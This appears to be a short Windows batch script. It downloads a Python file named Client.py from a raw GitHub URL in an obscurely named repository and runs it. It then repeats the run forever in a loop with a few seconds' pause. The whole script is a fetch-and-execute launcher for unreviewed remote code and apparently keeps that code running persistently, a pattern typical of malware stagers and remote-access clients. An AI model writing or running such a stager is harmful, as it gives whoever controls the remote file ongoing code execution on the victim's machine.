curl -o Client.py https://raw.githubusercontent.com/oogabooga245/-/main/Client.py
:top
python3 Client.py
timeout 3 >null.txt
del null.txt
goto :top